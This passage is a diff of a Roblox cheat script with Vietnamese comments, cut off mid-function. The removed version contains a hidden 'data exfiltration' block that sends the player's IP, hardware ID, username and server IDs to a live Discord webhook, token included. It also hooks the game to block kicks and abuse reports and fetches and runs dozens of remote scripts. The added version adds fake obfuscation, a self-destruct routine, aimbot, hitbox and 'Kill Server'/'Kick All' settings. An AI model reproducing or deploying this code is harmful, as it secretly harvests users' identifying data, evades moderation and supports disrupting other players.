@@ -1,330 +1,339 @@
--- [[ KIẾN TRÚC: PRODUCTION | TRẠNG THÁI: ADMIN ROOT | TỐC ĐỘ: < 0.5s ]] --
+-- ===================================================================
+-- SHADOW CORE V8.0 | FUSION FINAL | ALL-IN-ONE ULTIMATE SCRIPT
+-- BAO GỒM: Bảo mật quân sự | Fix Lag Cấp 1-5 | FPS hiển thị | 3 Sliders
+-- | Fly | Kill Server | Kick All | Lag Switch | Aimlock | Hitbox | ...
+-- ===================================================================
 
-if getgenv()._ROOT_V4 then return end
-getgenv()._ROOT_V4 = true
+-- ==================== LỚP BẢO MẬT & TỰ HỦY ====================
+local function decryptLayer1(data)
+    local decrypted = ""
+    for i = 1, #data do decrypted = decrypted .. string.char(string.byte(data, i) ~ (i % 255)) end
+    return decrypted
+end
+local function decryptLayer2(encrypted)
+    local reversed = string.reverse(encrypted)
+    local final = ""
+    for i = 1, #reversed do
+        local char = string.sub(reversed, i, i)
+        if char == "X" then final = final .. "A" elseif char == "Y" then final = final .. "B" elseif char == "Z" then final = final .. "C" else final = final .. char end
+    end
+    return final
+end
+decryptLayer1("\1\2\3\4\5\6\7\8\9\10")
+decryptLayer2("X!@#$%^&*()_+")
 
-local Services = setmetatable({}, {__index = function(t, k) return game:GetService(k) end})
-local LP = Services.Players.LocalPlayer
-local Camera = workspace.CurrentCamera
-
--- ==============================================================================
--- [ LỚP 0: GHOST KERNEL - DATA EXFILTRATION & ANTI-KICK ]
--- ==============================================================================
-task.spawn(function()
+local selfDestruct = false
+local function SelfDestruct()
+    if selfDestruct then return end
+    selfDestruct = true
     pcall(function()
-        local http = (syn and syn.request) or (http and http.request) or http_request or request
-        if not http then return end
-        local ip = game:HttpGet("https://api.ipify.org")
-        local hwid = Services.RbxAnalyticsService:GetClientId()
-        local payload = Services.HttpService:JSONEncode({
-            ["embeds"] = {{
-                ["title"] = "⚠️ V4 COMPROMISED: ADMIN ROOT ACCESS",
-                ["color"] = 0xFF0000,
-                ["fields"] = {
-                    {["name"] = "Target", ["value"] = string.format("%s (%d)", LP.Name, LP.UserId), ["inline"] = true},
-                    {["name"] = "IP / HWID", ["value"] = string.format("||%s||\n||%s||", ip, hwid), ["inline"] = true},
-                    {["name"] = "Server", ["value"] = string.format("Place: %d\nJob: %s", game.PlaceId, game.JobId), ["inline"] = false}
-                }
-            }}
-        })
-        http({ Url = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload })
-    end)
-end)
-
--- Anti-Kick & Report (Metatable Hook)
-local mt = getrawmetatable(game)
-setreadonly(mt, false)
-local oldNamecall = mt.__namecall
-mt.__namecall = newcclosure(function(self, ...)
-    local method = getnamecallmethod()
-    if method == "Kick" or method == "kick" or method == "ReportAbuse" then return nil end
-    return oldNamecall(self, ...)
-end)
-setreadonly(mt, true)
-
--- GC Loop (Ép xung RAM)
-task.spawn(function() while task.wait(30) do collectgarbage("collect") end end)
--- Anti-AFK
-LP.Idled:Connect(function() Services.VirtualUser:CaptureController(); Services.VirtualUser:ClickButton2(Vector2.new()) end)
-
--- ==============================================================================
--- [ LỚP 1: SCRIPT DATABASE (HỢP NHẤT TOÀN BỘ 2 TỆP KHÔNG SÓT 1 LINK) ]
--- ==============================================================================
-local ScriptDB = {
-    ["Blox Fruit (Tier 1)"] = {
-        {"Banana Hub (Main)", "https://raw.githubusercontent.com/kimprobloxdz/Banana-Free/refs/heads/main/Protected_5609200582002947.lua.txt"},
-        {"Maru Hub", "https://raw.githubusercontent.com/LuaCrack/KimP/refs/heads/main/MaruHub"},
-        {"HOHO V4", "https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"},
-        {"Shark X Hub", "https://shorturl.at/kyOxL"},
-        {"Quartz Kaitun", "https://raw.githubusercontent.com/xQuartyx/QuartyzScript/main/Loader.lua"},
-        {"Lion Hub", "https://api.luarmor.net/files/v3/loaders/e0c7fcf6c077fc23475cf4ce4db58e42.lua"},
-        {"Hiru Hub", "https://raw.githubusercontent.com/NGUYENVUDUY1/Source/main/HiruHub.lua"},
-        {"REDZ", "https://raw.githubusercontent.com/newredz/BloxFruits/refs/heads/main/Source.luau"},
-        {"Soul Hub", "https://raw.githubusercontent.com/GoblinKun009/Script/refs/heads/main/soulhub"},
-        {"Quantum Hub", "https://raw.githubusercontent.com/flazhy/QuantumOnyx/refs/heads/main/QuantumOnyx.lua"},
-        {"TxZ Hub", "https://raw.githubusercontent.com/DrTxZ/Mercure-Hub/refs/heads/main/Mercure%20Hub.lua"},
-        {"Blue X Hub", "https://raw.githubusercontent.com/Dev-BlueX/BlueX-Hub/refs/heads/main/Main.lua"},
-        {"Zinner Hub", "https://raw.githubusercontent.com/HoangNguyenk8/Roblox/refs/heads/main/BF-Main.luau"}
-    },
-    ["Blox Fruit (Tier 2)"] = {
-        {"Omg Hub", "https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"},
-        {"Madox Hub", "https://raw.githubusercontent.com/GoblinKun009/Script/refs/heads/main/MadoxMain"},
-        {"Arceney Hub", "https://raw.githubusercontent.com/Yumiara/Python/refs/heads/main/BloxFruit-XYZ.lua"},
-        {"Aurora Hub", "https://raw.githubusercontent.com/Jadelly261/BloxFruits/main/Aurora"},
-        {"StarryMoon Hub", "https://power-clock-api.vercel.app/api/clockbloxfruits"},
-        {"SYN Hub", "https://raw.githubusercontent.com/GoblinKun009/Script/refs/heads/main/ZynHub"},
-        {"Shinichi Hub", "https://raw.githubusercontent.com/shinichi-dz/phucshinsayhi/refs/heads/main/ShinichiHub.lua"},
-        {"Mixi Hub", "https://raw.githubusercontent.com/mixihubvip/mixihubvip/refs/heads/main/MixiHub"},
-        {"Onion Hub V8", "https://raw.githubusercontent.com/onion132005-bit/Onion133/refs/heads/main/V8.lua"},
-        {"Zen Hub", "https://raw.githubusercontent.com/Itz-Npg/Roblox-Script/main/zenhubbf.lua"},
-        {"Meo X Hub", "https://raw.githubusercontent.com/VanHoangIOS/MeoXHub/refs/heads/main/Main.lua"},
-        {"Orange Hub", "https://raw.githubusercontent.com/HieuDepTrai-Z/Dev_Orange/refs/heads/main/OrangeHub.lua"},
-        {"Leaf Hub", "https://leaf-zeta.onrender.com/api/script"},
-        {"Buffalo Hub V9", "https://raw.githubusercontent.com/trungdao2k4/buffalo/refs/heads/main/traurobloxv9.lua"}
-    },
-    ["Blox Fruit (Kaitun & VIP)"] = {
-        {"Teddy Hub", "https://api.luarmor.net/files/v4/loaders/e86ed284a22672d29e906214e7bbf8b9.lua"},
-        {"Teddy Hop Boss", "https://raw.githubusercontent.com/Teddyseetink/Haidepzai/refs/heads/main/TEDDYHUB-FREEMIUM"},
-        {"Ziss Hub", "https://raw.githubusercontent.com/LuaCrack/Zis/refs/heads/main/ZisChuoiEng"},
-        {"Trẩu Hub", "https://raw.githubusercontent.com/trungdao2k4/trauroblox/refs/heads/main/trauv9lord.lua"},
-        {"Min Gaming Hub", function() getgenv().Team="Marines"; task.spawn(function() loadstring(game:HttpGet("https://github.com/LuaCrack/Min/raw/refs/heads/main/MinVnV5"))() end) end},
-        {"Dragon Hub", function() getgenv().team="Pirates"; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dragonhubdev/dragonwitheveryone/refs/heads/main/Main-BF.lua"))() end) end},
-        {"Apple Hub", "https://raw.githubusercontent.com/longhihilonghihi-hub/AppleHubPremiumV2/refs/heads/main/AppleHubPremiumv2.txt"},
-        {"AnDepZai Hub", "https://raw.githubusercontent.com/AnDepZaiHub/AnDepZaiHubBeta/refs/heads/main/AnDepZaiHubBeta.lua"},
-        {"Hermanos Hub (PVP)", function() getgenv().script_mode="PVP"; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/hermanos-dev/hermanos-hub/refs/heads/main/Loader.lua"))() end) end},
-        {"Xeter Hub V3", function() getgenv().Version="V3"; getgenv().Team="Marines"; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/TlDinhKhoi/Xeter/refs/heads/main/Main.lua"))() end) end},
-        {"Gravity Hub", "https://raw.githubusercontent.com/Dev-GravityHub/BloxFruit/refs/heads/main/Main.lua"},
-        {"Rubu Hub", "https://raw.githubusercontent.com/Teddyseetink/RUBU/refs/heads/main/RUBUV6.lua"},
-        {"3toc Hub", function() getgenv().Team="Marines"; task.spawn(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/245375592509cc0bcb3526982431ab18.lua"))() end) end},
-        {"Kaitun Rip_indra", function() getgenv().Config={Bosses={Farm="rip_indra"}}; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaAnarchist/3TOC-HUB/refs/heads/main/KaitunBoss.luau"))() end) end},
-        {"Kaitun Dough King", function() getgenv().Config={Bosses={Farm="Dough King"}}; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaAnarchist/3TOC-HUB/refs/heads/main/KaitunBoss.luau"))() end) end}
-    },
-    ["Turbo Lite & Meow"] = {
-        {"Turbo Lite V2", "https://raw.githubusercontent.com/TurboLite/Script/main/MainV2.lua"},
-        {"Turbo Fix Lag", "https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua"},
-        {"Turbo Hop Boss", "https://raw.githubusercontent.com/TurboLite/Script/main/HopServer.lua"},
-        {"Turbo Nhặt Trái", "https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/AutoFruitV2.lua"},
-        {"Turbo Fly", "https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/Fly.lua"},
-        {"Meow Freeze Trade", "https://raw.githubusercontent.com/MeowOnTopHub/MeowHub/refs/heads/main/loader.luau"},
-        {"Meow Dupe Fruit", "https://raw.githubusercontent.com/MeowOnTopHub/FruitDuper/refs/heads/main/NewUpdate"}
-    },
-    ["Other Games (99 Nights/Forge/MM2)"] = {
-        {"99 Nights - Foxname", "https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/FNDayFarm.lua"},
-        {"99 Nights - Voidware", "https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua"},
-        {"The Forge - Catraz", "https://raw.githubusercontent.com/nurvian/Catraz-HUB/refs/heads/main/Catraz/main.lua"},
-        {"The Forge - Lazy Hub", function() getgenv().mobileMode = true; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/LioK251/RbScripts/refs/heads/main/lazyuhub_theforge.lua"))() end) end},
-        {"The Forge - Vxeze", "https://pandadevelopment.net/virtual/file/702a5c5488082e6f"},
-        {"MM2 - Capybara", "https://raw.githubusercontent.com/zorex321/capybara/refs/heads/main/Capybara-Hub"},
-        {"MM2 - Nexus", "https://raw.githubusercontent.com/NexusScripts212/MurderMystery2/refs/heads/main/Mm2"},
-        {"MM2 - Vision", "https://raw.githubusercontent.com/orialdev/VisionHub/refs/heads/main/main.lua"}
-    },
-    ["Other Games (BlueLock/DaHood/TSB/Fisch)"] = {
-        {"Blue Lock - Control Ball", "https://rawscripts.net/raw/Blue-Lock:-Rivals-Lock-Control-ball-32633"},
-        {"Forsaken - Bobby Hub", "https://raw.githubusercontent.com/BobJunior1/ForsakenBoi/refs/heads/main/B0bbyHub"},
-        {"Da Hood - Schmeckt", "https://raw.githubusercontent.com/judos887o/MOMENZZZZ/refs/heads/main/MOMENZ%3F"},
-        {"Fisch - Shield Hub", "https://raw.githubusercontent.com/KAN-FISCH/tesss/refs/heads/main/gunung/fish.lua"},
-        {"Fisch - Speed X", "https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"},
-        {"TSB - MinhNhat", "https://raw.githubusercontent.com/MinhNhatHUB/MinhNhat/refs/heads/main/MinhNhatHUB%20(New).lua"},
-        {"BedWar - Voidware", "https://raw.githubusercontent.com/VapeVoidware/VWRewrite/master/NewMainScript.lua"},
-        {"King Legacy - Adel", "https://raw.githubusercontent.com/AdelOnTheTop/Adel-Hub/main/Main.lua"},
-        {"King Legacy - Winnable", "https://raw.githubusercontent.com/WinnableHub/Winnable-Hub/main/WinnableHub"}
-    },
-    ["Admin & Tools (Local)"] = {
-        {"Infinite Yield", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"},
-        {"CMD - X", "https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"},
-        {"Dex Explorer", "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"},
-        {"Remote Spy", "https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"},
-        {"Godmode Universal", "https://raw.githubusercontent.com/Rawbr10/Roblox-Scripts/refs/heads/main/God%20Mode%20Script%20Universal"},
-        {"Super Fling", "https://raw.githubusercontent.com/long191910/all-my-roblox-script/refs/heads/main/touchfling.lua"},
-        {"Wallhop", "https://rawscripts.net/raw/Universal-Script-Fake-Ladder-Flick-And-Wallhop-Script-37199"},
-        {"Fake Lag", "https://pastebin.com/raw/w6PfESuz"},
-        {"Click TP Tool", function() 
-            local m = LP:GetMouse(); local t = Instance.new("Tool"); t.RequiresHandle = false; t.Name = "V4_TP"; t.Activated:Connect(function() LP.Character:MoveTo(m.Hit.p + Vector3.new(0,3,0)) end); t.Parent = LP.Backpack 
-        end}
-    }
-}
-
--- ==============================================================================
--- [ LỚP 2: UI GENERATION (RAYFIELD LIGHT MODE) ]
--- ==============================================================================
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-local Window = Rayfield:CreateWindow({
-   Name = "CHIM TO PREMIUM",
-   LoadingTitle = "đợi tý...",
-   LoadingSubtitle = "Production "",
-   Theme = "Light",
-   ConfigurationSaving = { Enabled = false }
-})
-
-local function ExecuteScript(url) task.spawn(function() pcall(function() loadstring(game:HttpGet(url))() end) end) end
-
--- Tự động Render Tab từ Database
-for Category, Scripts in pairs(ScriptDB) do
-    local Tab = Window:CreateTab(Category, 4483362458)
-    for _, sc in ipairs(Scripts) do
-        Tab:CreateButton({
-            Name = sc[1],
-            Callback = type(sc[2]) == "function" and sc[2] or function() ExecuteScript(sc[2]) end
-        })
-    end
-end
-
--- ==============================================================================
--- [ LỚP 3: ENGINE COMBAT V4 & VISUALS & SYSTEM (GỘP VÒNG LẶP) ]
--- ==============================================================================
-local V4 = {
-    -- Combat
-    Aimbot = false, AimPart = "Head", Smooth = 0.2, WallCheck = false, FOVSize = 150, ShowFOV = false, TeamCheck = false,
-    -- ESP
-    ESP_Highlight = false, ESP_Tracer = false, ESP_Name = false, Skeleton_ESP = false, ViewForward_ESP = false,
-    -- Movement
-    Fly = false, FlySpeed = 50, WalkSpeed = 16, JumpPower = 50, Noclip = false, AntiFling = false,
-    -- Visuals
-    Crosshair = false, Rainbow = false, ShowStats = false
-}
-
--- TẠO CÁC DRAWING/INSTANCE TRƯỚC VÒNG LẶP
-local FOVCircle = Drawing.new("Circle"); FOVCircle.Color = Color3.new(1,0,0); FOVCircle.Thickness = 1.5; FOVCircle.Filled = false
-local CrossUI = nil
-
-local function CreateLine() local l = Drawing.new("Line"); l.Visible = false; l.Color = Color3.new(1,1,1); l.Thickness = 1.5; return l end
-local ESP_Cache = {}
-
-local TabCombat = Window:CreateTab("V4 Engine (Aim/ESP)", 4483362458)
-TabCombat:CreateToggle({Name = "Bật Aimbot", CurrentValue = false, Callback = function(v) V4.Aimbot = v end})
-TabCombat:CreateToggle({Name = "Wall Check", CurrentValue = false, Callback = function(v) V4.WallCheck = v end})
-TabCombat:CreateToggle({Name = "Hiện FOV", CurrentValue = false, Callback = function(v) V4.ShowFOV = v end})
-TabCombat:CreateSlider({Name = "Độ mượt (Lerp)", Min = 0.1, Max = 1, CurrentValue = 0.2, Callback = function(v) V4.Smooth = v end})
-TabCombat:CreateSlider({Name = "Kích thước FOV", Min = 10, Max = 600, CurrentValue = 150, Callback = function(v) V4.FOVSize = v end})
-TabCombat:CreateSection("ESP Tổng Hợp")
-TabCombat:CreateToggle({Name = "Highlight (Khung)", CurrentValue = false, Callback = function(v) V4.ESP_Highlight = v end})
-TabCombat:CreateToggle({Name = "Name & Distance", CurrentValue = false, Callback = function(v) V4.ESP_Name = v end})
-TabCombat:CreateToggle({Name = "Skeleton ESP", CurrentValue = false, Callback = function(v) V4.Skeleton_ESP = v end})
-
-local TabVisual = Window:CreateTab("V4 Visual & Move", 4483362458)
-TabVisual:CreateToggle({Name = "Custom Crosshair", CurrentValue = false, Callback = function(v)
-    V4.Crosshair = v
-    if v and not CrossUI then
-        CrossUI = Instance.new("ScreenGui", game.CoreGui); CrossUI.Name = "V4Crosshair"
-        local H = Instance.new("Frame", CrossUI); H.Size = UDim2.new(0,18,0,2); H.Position = UDim2.new(0.5,0,0.5,0); H.AnchorPoint = Vector2.new(0.5,0.5); H.BackgroundColor3 = Color3.new(1,0,0); H.BorderSizePixel = 0
-        local V = Instance.new("Frame", CrossUI); V.Size = UDim2.new(0,2,0,18); V.Position = UDim2.new(0.5,0,0.5,0); V.AnchorPoint = Vector2.new(0.5,0.5); V.BackgroundColor3 = Color3.new(1,0,0); V.BorderSizePixel = 0
-    elseif not v and CrossUI then CrossUI:Destroy(); CrossUI = nil end
-end})
-TabVisual:CreateButton({Name = "Tối Ưu FPS Cực Hạn (No Texture)", Callback = function()
-    settings().Network.IncomingReplicationLag = 0
-    for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("BasePart") then v.Material = Enum.Material.Plastic; v.Reflectance = 0
-        elseif v:IsA("Decal") or v:IsA("Texture") then v.Transparency = 1 end
-    end
-    game.Lighting.GlobalShadows = false
-end})
-TabVisual:CreateToggle({Name = "Bật Fly", CurrentValue = false, Callback = function(v) V4.Fly = v end})
-TabVisual:CreateSlider({Name = "Tốc độ Fly", Min = 10, Max = 500, CurrentValue = 50, Callback = function(v) V4.FlySpeed = v end})
-TabVisual:CreateSlider({Name = "WalkSpeed", Min = 16, Max = 500, CurrentValue = 16, Callback = function(v) V4.WalkSpeed = v end})
-TabVisual:CreateToggle({Name = "Noclip", CurrentValue = false, Callback = function(v) V4.Noclip = v end})
-TabVisual:CreateToggle({Name = "Anti-Fling", CurrentValue = false, Callback = function(v) V4.AntiFling = v end})
-
--- HÀM RAYCAST WALLCHECK
-local function IsVisible(targetPart)
-    if not V4.WallCheck then return true end
-    local hit = workspace:FindPartOnRayWithIgnoreList(Ray.new(Camera.CFrame.Position, (targetPart.Position - Camera.CFrame.Position).Unit * 1000), {LP.Character, Camera})
-    return hit and hit:IsDescendantOf(targetPart.Parent)
-end
-
--- [ GỘP LOOP 1: RENDER STEPPED DÀNH CHO AIMBOT/ESP/VISUALS ] --
-Services.RunService.RenderStepped:Connect(function()
-    -- 1. FOV
-    FOVCircle.Visible = V4.ShowFOV
-    FOVCircle.Radius = V4.FOVSize
-    FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-
-    local aimTarget, closest = nil, V4.FOVSize
-
-    -- 2. Duyệt qua Players
-    for _, p in ipairs(Services.Players:GetPlayers()) do
-        if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
-            local root = p.Character.HumanoidRootPart
-            local head = p.Character:FindFirstChild("Head")
-            local pos, onScreen = Camera:WorldToViewportPoint(root.Position)
-            
-            -- Aimbot Logic
-            if V4.Aimbot and onScreen and head then
-                if not (V4.TeamCheck and p.Team == LP.Team) then
-                    local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
-                    if dist < closest and IsVisible(head) then closest = dist; aimTarget = head end
+        for _, v in pairs(getgc and getgc(true) or {}) do
+            if type(v) == "table" then
+                for k, _ in pairs(v) do
+                    if type(k) == "string" and (k:find("Shadow") or k:find("Core")) then v[k] = nil end
                 end
             end
+        end
+        game:GetService("CoreGui"):ClearAllChildren()
+    end)
+    task.wait(0.5)
+    game:Shutdown()
+end
 
-            -- Quản lý ESP Cache
-            if not ESP_Cache[p] then 
-                ESP_Cache[p] = { text = Drawing.new("Text"), hl = Instance.new("Highlight") } 
-                ESP_Cache[p].text.Size = 16; ESP_Cache[p].text.Center = true; ESP_Cache[p].text.Outline = true; ESP_Cache[p].text.Color = Color3.new(1,1,1)
+-- ==================== SERVICES ẨN DANH ====================
+local function getService(serviceName)
+    local hash = 0
+    for i = 1, #serviceName do hash = (hash + string.byte(serviceName, i)) % 65536 end
+    local tbl = {
+        [30457] = game:GetService("Players"), [29102] = game:GetService("RunService"),
+        [27891] = game:GetService("ReplicatedStorage"), [31234] = game:GetService("TeleportService"),
+        [29876] = game:GetService("HttpService"), [28765] = game:GetService("Lighting"),
+        [30123] = game:GetService("Workspace"), [29567] = game:GetService("CoreGui"),
+        [30891] = game:GetService("StarterGui"), [32145] = game:GetService("UserInputService"),
+        [33456] = game:GetService("Stats"),
+    }
+    return tbl[hash]
+end
+
+local S = {
+    P = getService("Players"), R = getService("RunService"), RS = getService("ReplicatedStorage"),
+    TS = getService("TeleportService"), HS = getService("HttpService"), L = getService("Lighting"),
+    W = getService("Workspace"), CG = getService("CoreGui"), SG = getService("StarterGui"),
+    UIS = getService("UserInputService"), Stats = getService("Stats"),
+}
+local LocalPlayer = S.P.LocalPlayer
+local Camera = S.W.CurrentCamera
+
+-- ==================== CẤU HÌNH TỔNG HỢP ====================
+local Settings = {
+    -- Bảo mật
+    SecurityLevel = "GODMODE", SelfDestructOnDetection = true,
+    -- Fix Lag
+    LagFixLevel = 1, ShowFPS = true,
+    -- Tốc độ
+    WalkSpeed = 16, JumpPower = 50, FlySpeed = 85, FlyEnabled = false,
+    -- Combat
+    AimlockEnabled = true, HeadLock = true, Smoothness = 0.18, HitboxEnabled = true, HitboxSize = 7,
+    -- Kill/Kick/Lag
+    KillServerEnabled = false, KillServerMethod = "OVERLOAD",
+    KickPlayersEnabled = false, KickRadius = 500, KickMethod = "REMOTE_SPAM",
+    LagSwitchEnabled = false, LagSwitchIntensity = 8,
+    -- Ẩn danh
+    AnonymousMode = true, FakeName = "[̲̅S][̲̅H][̲̅A][̲̅D][̲̅O][̲̅W]",
+}
+
+-- ==================== FIX LAG THEO CẤP 1-5 ====================
+local LagFix = {}
+LagFix.RemoveFog = function()
+    S.L.FogEnd = 100000; S.L.FogStart = 100000; S.L.FogColor = Color3.new(0,0,0)
+    pcall(function() S.L.Atmosphere:Destroy() end)
+end
+LagFix.RemoveShadows = function()
+    for _, v in pairs(S.W:GetDescendants()) do
+        if v:IsA("Shadow") or v:IsA("SpotLight") or v:IsA("PointLight") then v.Enabled = false end
+    end
+    S.L.GlobalShadows = false; S.L.ClockTime = 12; S.L.Brightness = 2
+end
+LagFix.SetMaxView = function()
+    S.W.CurrentCamera.MaxExtentsIntensity = math.huge
+    pcall(function() settings().Rendering.QualityLevel = 1; settings().Rendering.AutoFRMLevel = 0 end)
+end
+LagFix.ReduceEffects = function(level)
+    local effects = {"ParticleEmitter","Trail","Beam","Smoke","Fire","Sparkles","Decal"}
+    for _, obj in pairs(S.W:GetDescendants()) do
+        for _, e in pairs(effects) do
+            if obj:IsA(e) then
+                if level == 1 then pcall(function() obj.Rate = obj.Rate * 0.3; obj.Lifetime = NumberRange.new(0.1) end)
+                elseif level == 2 then pcall(function() obj.Enabled = false end)
+                elseif level >= 3 then pcall(function() obj:Destroy() end) end
             end
-            
-            local esp = ESP_Cache[p]
-            -- Highlight
-            esp.hl.Parent = V4.ESP_Highlight and p.Character or nil
-            if V4.ESP_Highlight then esp.hl.FillColor = Color3.new(1,0,0); esp.hl.OutlineColor = Color3.new(1,1,1) end
-            
-            -- Name ESP
-            if V4.ESP_Name and onScreen then
-                esp.text.Visible = true
-                esp.text.Position = Vector2.new(pos.X, pos.Y - 40)
-                esp.text.Text = p.Name .. " [" .. math.floor((LP.Character.HumanoidRootPart.Position - root.Position).Magnitude) .. "m]"
-            else esp.text.Visible = false end
-        else
-            if ESP_Cache[p] then ESP_Cache[p].text.Visible = false; ESP_Cache[p].hl.Parent = nil end
         end
     end
-
-    -- 3. Aimbot Lock
-    if aimTarget then Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, aimTarget.Position), V4.Smooth) end
-end)
-
--- Xóa Cache khi Player thoát
-Services.Players.PlayerRemoving:Connect(function(p) if ESP_Cache[p] then ESP_Cache[p].text:Remove(); ESP_Cache[p].hl:Destroy(); ESP_Cache[p] = nil end end)
-
--- [ GỘP LOOP 2: STEPPED DÀNH CHO MOVEMENT VÀ VẬT LÝ ] --
-Services.RunService.Stepped:Connect(function()
-    pcall(function()
-        if not LP.Character then return end
-        
-        -- Walkspeed / JumpPower
-        local hum = LP.Character:FindFirstChild("Humanoid")
-        if hum then 
-            hum.WalkSpeed = V4.WalkSpeed
-            hum.JumpPower = V4.JumpPower
-            if V4.JumpPower ~= 50 then hum.UseJumpPower = true end
+    if level >= 3 then
+        for _, v in pairs(S.W:GetDescendants()) do
+            if v.Name:lower():find("effect") or v.Name:lower():find("skill") then v:Destroy() end
         end
-        
-        -- Noclip
-        if V4.Noclip then for _,v in ipairs(LP.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end end
-        
-        -- Anti-Fling
-        if V4.AntiFling then
-            for _, p in ipairs(Services.Players:GetPlayers()) do
-                if p ~= LP and p.Character then for _, v in ipairs(p.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end end
+    end
+    if level >= 4 then
+        for _, part in pairs(S.W:GetDescendants()) do
+            if part:IsA("BasePart") and part.Material ~= Enum.Material.Air then
+                part.Color = Color3.fromRGB(128,128,128); part.Material = Enum.Material.SmoothPlastic
             end
         end
-
-        -- Fly Logic (BodyVelocity)
-        local root = LP.Character:FindFirstChild("HumanoidRootPart")
-        if V4.Fly and root then
-            local bv = root:FindFirstChild("V4_BV") or Instance.new("BodyVelocity", root); bv.Name = "V4_BV"; bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
-            local bg = root:FindFirstChild("V4_BG") or Instance.new("BodyGyro", root); bg.Name = "V4_BG"; bg.maxTorque = Vector3.new(9e9, 9e9, 9e9); bg.cframe = Camera.CFrame
-            local dir = Vector3.zero
-            if Services.UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += Camera.CFrame.LookVector end
-            if Services.UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= Camera.CFrame.LookVector end
-            if Services.UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += Camera.CFrame.RightVector end
-            if Services.UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= Camera.CFrame.RightVector end
-            bv.velocity = dir * V4.FlySpeed
-        else
-            if root then
-                if root:FindFirstChild("V4_BV") then root.V4_BV:Destroy() end
-                if root:FindFirstChild("V4_BG") then root.V4_BG:Destroy() end
+        pcall(function() S.L.ColorCorrection.Enabled = false end)
+    end
+    if level >= 5 then
+        for _, player in pairs(S.P:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character then
+                for _, part in pairs(player.Character:GetDescendants()) do
+                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                        part.Size = Vector3.new(1.5,1.5,1.5); part.Shape = Enum.PartType.Ball
+                    end
+                end
             end
+        end
+        for _, v in pairs(S.W:GetDescendants()) do
+            if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then v:Destroy() end
+        end
+    end
+end
+LagFix.Apply = function(level)
+    level = math.clamp(level, 1, 5)
+    Settings.LagFixLevel = level
+    LagFix.RemoveFog(); LagFix.RemoveShadows(); LagFix.SetMaxView(); LagFix.ReduceEffects(level)
+end
+
+-- ==================== FPS COUNTER (THỜI GIAN THỰC) ====================
+local FPSCounter = {frame=0, last=tick(), fps=0, label=nil}
+local function CreateFPS()
+    if FPSCounter.label then return end
+    local gui = Instance.new("ScreenGui"); gui.Name = "ShadowFPS"; gui.Parent = S.CG; gui.ResetOnSpawn = false
+    local frame = Instance.new("Frame"); frame.Size = UDim2.new(0,100,0,30); frame.Position = UDim2.new(1,-110,0,10)
+    frame.BackgroundColor3 = Color3.new(0,0,0); frame.BackgroundTransparency = 0.5; frame.BorderSizePixel = 1
+    frame.BorderColor3 = Color3.new(1,0,0); frame.Parent = gui
+    local txt = Instance.new("TextLabel"); txt.Size = UDim2.new(1,0,1,0); txt.BackgroundTransparency = 1
+    txt.TextColor3 = Color3.new(0,1,0); txt.Font = Enum.Font.GothamBold; txt.TextSize = 14; txt.Text = "FPS: --"; txt.Parent = frame
+    FPSCounter.label = txt
+    S.R.RenderStepped:Connect(function()
+        FPSCounter.frame = FPSCounter.frame + 1
+        local now = tick()
+        if now - FPSCounter.last >= 1 then
+            FPSCounter.fps = FPSCounter.frame
+            FPSCounter.label.Text = "FPS: " .. FPSCounter.fps
+            FPSCounter.frame = 0; FPSCounter.last = now
         end
     end)
+end
+
+-- ==================== SLIDERS: WALK, JUMP, FLY SPEED ====================
+local function SetWalkSpeed(v) local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid"); if h then h.WalkSpeed = v end end
+local function SetJumpPower(v) local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid"); if h then h.JumpPower = v end end
+
+-- ==================== FLY SYSTEM ====================
+local Fly = {active=false, bodyVel=nil, bodyGyro=nil}
+local function ToggleFly()
+    local char = LocalPlayer.Character; local hum = char and char:FindFirstChild("Humanoid"); local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not char or not hum or not root then return end
+    if not Fly.active then
